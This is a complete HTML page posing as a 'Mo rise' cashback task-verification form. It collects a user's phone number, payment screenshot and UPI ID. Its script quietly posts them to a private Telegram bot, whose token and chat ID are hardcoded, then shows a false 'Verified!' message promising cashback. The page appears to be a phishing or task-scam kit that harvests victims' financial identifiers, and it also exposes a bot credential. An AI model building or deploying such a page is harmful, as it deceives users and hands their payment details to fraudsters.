<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mo rise Task Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
        body { font-family: 'Poppins', sans-serif; }
    </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center p-4">

    <div class="w-full max-w-md text-center py-6">
        <h1 class="text-2xl font-bold text-[#003780]">Mo rise <span class="text-blue-500 font-normal">Task verification</span></h1>
    </div>

    <div id="main-card" class="bg-white w-full max-w-md rounded-2xl shadow-xl overflow-hidden border border-gray-100">
       
        <div class="bg-gray-50 p-4 border-b">
            <p class="text-center text-xs font-bold text-gray-500 uppercase tracking-widest mb-3">Demo Screenshot</p>
            <div class="flex justify-center">
                <img src="deno.jpeg" alt="Demo" class="rounded-lg shadow-md border-2 border-blue-100 max-h-64 object-contain">
            </div>
        </div>

        <form id="taskForm" class="p-6 space-y-5">
            <div>
                <label class="block text-sm font-semibold text-gray-700 mb-1">Registered Number</label>
                <input type="tel" id="phone" pattern="[0-9]{10}" placeholder="Type mo rise Ragisterd number"
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition-all" required>
            </div>

            <div>
                <label class="block text-sm font-semibold text-gray-700 mb-1">Submit Screenshot</label>
                <div class="relative border-2 border-dashed border-gray-200 rounded-xl p-3 bg-gray-50 hover:bg-gray-100 transition-all text-center">
                    <input type="file" id="screenshot" accept="image/*" class="w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700" required>
                </div>
            </div>

            <div>
                <label class="block text-sm font-semibold text-gray-700 mb-1">Type Same UPI ID</label>
                <input type="text" id="upi" placeholder="Match the UPI ID from Campingn"
                    class="w-full p-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition-all" required>
                <p class="text-[10px] text-gray-400 mt-1">*Match the UPI ID from Campingn</p>
            </div>

            <button type="submit" id="submitBtn" class="w-full bg-[#003780] hover:bg-blue-900 text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition-all">
                SUBMIT VERIFICATION
            </button>
        </form>
    </div>

    <div id="success-card" class="hidden bg-white w-full max-w-md rounded-2xl shadow-xl p-10 text-center animate-bounce">
        <div class="bg-green-100 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg class="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
        </div>
        <h2 class="text-2xl font-bold text-gray-800">Verified!</h2>
        <p class="text-gray-500 mt-2 text-sm">Done✅ <br>wait 12-24 hours for cashback।</p>
    </div>

    <script>
        const token = "8066403769:AAFaP7_bxMvM8oKdYNLnzE4IOcjZSBonUXA";
        const chatId = "7667656908";

        window.onload = () => {
            if (localStorage.getItem('task_done') === 'true') {
                showSuccess();
            }
        };

        function showSuccess() {
            document.getElementById('main-card').classList.add('hidden');
            document.getElementById('success-card').classList.remove('hidden');
        }

        document.getElementById('taskForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = "Please wait...";
            btn.disabled = true;

            const phone = document.getElementById('phone').value;
            const upi = document.getElementById('upi').value;
            const file = document.getElementById('screenshot').files[0];

            const formData = new FormData();
            formData.append('chat_id', chatId);
            // यहाँ डेटा लिंक हो रहा है टेलीग्राम के साथ
            formData.append('caption', `🚀 *NEW TASK !* \n\n📱 नंबर: ${phone} \n💳 UPI ID: ${upi} \n⏰ समय: ${new Date().toLocaleString()}`);
            formData.append('photo', file);

            try {
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                localStorage.setItem('task_done', 'true');
                showSuccess();
            } catch (err) {
                alert("Error: Internet check karein!");
                btn.innerText = "SUBMIT VERIFICATION";
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
